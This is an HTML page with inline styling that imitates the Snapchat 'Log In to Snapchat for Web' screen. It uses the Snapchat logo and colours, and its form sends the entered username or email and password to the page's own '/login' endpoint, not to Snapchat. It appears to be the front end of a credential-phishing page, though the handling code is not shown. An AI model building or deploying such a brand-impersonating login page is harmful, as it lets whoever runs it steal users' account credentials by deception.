<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <link rel="icon" type="image/png" href="favicon.png"> <!-- Favicon -->
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background-color: #FFFFFF; /* Snapchat yellow */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #FFFFFF;
            border-radius: 20px;
            box-shadow: 0px 20px 30px rgba(0, 0, 0, 0.3);
            padding: 20px;  /* Reduce padding */
            text-align: center;
            width: 310px;  /* Reduce width */
        }

        .logo {
            width: 100px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            color: #000000; /* Black color for text */
            margin-bottom: 10px;
        }

        h2 {
            font-size: 20px;
            color: #000000; /* Black color for "for Web" text */
            margin-bottom: 30px;
        }

        .label {
            text-align: left;
            color: #000000; /* Black color */
            font-size: 14px;
            margin-bottom: 5px;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 12px;
            border: 2px solid #E0E0E0; /* Lighter border color */
            font-size: 16px;
            box-sizing: border-box;
        }

        .forgot-password-btn {
            background-color: transparent;
            border: none;
            color: #000000; /* Black color */
            font-size: 14px;
            cursor: pointer;
            text-align: right;
            margin-bottom: 10px;
            display: block;
        }

        .login-btn {
            background-color: #FFFC00;
            border: none;
            color: #000000;
            padding: 10px 0;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            width: 40%; /* Smaller login button */
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #E8E600;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Using the uploaded Snapchat logo -->
        <img src="icon.svg" alt="Snapchat Logo" class="logo">
        
        <!-- Title -->
        <h1>Log In to Snapchat</h1>
        <h2>for Web</h2>
        
        <!-- Input fields with labels above them -->
        <form action="/login" method="POST">
            <div class="label">Username or Email</div>
            <input type="text" name="username" class="input-field">

            <div class="label">Password</div>
            <input type="password" name="password" class="input-field">

            <!-- Forgot Password Button -->
            <button class="forgot-password-btn" type="button">Forgot Password?</button>
            
            <!-- Login button -->
            <button class="login-btn" type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
